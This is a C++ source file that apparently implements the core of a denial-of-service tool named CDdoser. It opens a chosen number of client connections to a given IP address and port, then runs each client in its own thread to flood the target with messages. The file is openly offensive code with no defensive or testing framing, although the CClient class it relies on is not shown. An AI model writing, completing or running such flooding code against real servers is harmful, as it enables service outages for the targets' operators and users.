#define _CRT_SECURE_NO_WARNINGS


#include "Ddoser.h"
#include<iostream>


CDdoser::CDdoser(char *_ip, WORD _port, size_t _clientCount, WORD _sleepTime, DWORD _msgLength)
{
  m_ip = new char[strlen(_ip) + 1];
  strcpy(m_ip, _ip);
  m_port = _port;
  m_sleepTime = _sleepTime;
  m_msgLength = _msgLength;
  m_clientsCount = _clientCount;
  initClients();
}


CDdoser::~CDdoser()
{
  if (m_ip)
    delete[]m_ip;
  for (int i = 0; i < m_clientsCount; i++)
  {
    if (m_clients[i])
      delete m_clients[i];
  }
}

void CDdoser::initClients()
{
  m_clients.reserve(m_clientsCount);
  for (int i = 0; i < m_clientsCount; i++)
  {
    CClient *newClient = new CClient(m_msgLength, m_sleepTime,i);
    newClient->connectToServer(m_ip, m_port);
    //newClient->run();
    m_clients.push_back(newClient);
  }
  std::cout << "Clinets cout = " << m_clients.size();
}
DWORD WINAPI CDdoser::s_runClient(LPVOID _lpParam)
{
  CClient *client = (CClient*)_lpParam;
  if (client)
  {
    client->run();
    return 0;
  }
  return 1;
}
void CDdoser::run()
{
  std::cout << "RUN!" << std::endl;
  HANDLE *threads = new HANDLE[m_clientsCount];
  for (int i = 0; i < m_clientsCount; i++)
  {
    threads[i] = CreateThread(0, 0, s_runClient, (LPVOID)m_clients[i], 0, 0);
  }
  WaitForMultipleObjects(m_clientsCount, threads, true, INFINITE);
  for (int i = 0; i < m_clientsCount; i++)
  {
    CloseHandle(threads[i]);
  }
  delete[] threads;
}